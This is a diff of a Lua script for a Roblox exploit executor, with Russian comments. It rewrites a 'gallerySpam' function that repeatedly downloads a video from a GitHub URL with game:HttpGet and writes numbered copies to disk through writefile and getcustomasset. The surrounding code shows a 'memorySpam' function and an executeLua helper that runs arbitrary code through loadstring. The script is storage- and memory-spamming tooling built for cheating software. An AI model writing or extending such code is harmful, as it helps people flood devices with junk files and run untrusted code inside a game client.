@@ -223,40 +223,30 @@ local function memorySpam(fileCount)
 end
 
 -- Gallery Spam функция с загрузкой с GitHub
+-- Простая версия как в твоем скрипте
 local function gallerySpam(imageCount)
-    local githubUrls = {
-        "https://github.com/HappyCow91/RobloxScripts/raw/main/Videos/videoplayback.mp4",
-    }
-    
-    local paths = getSavePaths()
     local successCount = 0
-    local selectedUrl = githubUrls[1]
     
     for i = 1, imageCount do
-        local extension = "mp4"
-        local filename = "video_" .. i .. "_" .. math.random(1000, 9999) .. "." .. extension
-        
-        for _, path in ipairs(paths) do
-            local fullPath = path .. filename
-            local success = pcall(function()
-                if writefile then
-                    return downloadFromGitHub(selectedUrl, fullPath)
-                end
-                return false
-            end)
+        local success = pcall(function()
+            -- Скачиваем и сохраняем напрямую как в твоем примере
+            writefile("video_" .. i .. ".mp4", game:HttpGet("https://github.com/HappyCow91/RobloxScripts/raw/main/Videos/videoplayback.mp4"))
             
-            if success then
-                successCount = successCount + 1
-                break
-            end
+            -- Получаем путь через getcustomasset чтобы файл был доступен
+            local path = getcustomasset("video_" .. i .. ".mp4")
+            
+            return true
+        end)
+        
+        if success then
+            successCount = successCount + 1
         end
         
-        task.wait(0.1)
+        task.wait(0.3)
     end
     
     return successCount
 end
-
 -- Выполнение Lua-кода
 local function executeLua(code)
     local func, err = loadstring(code)
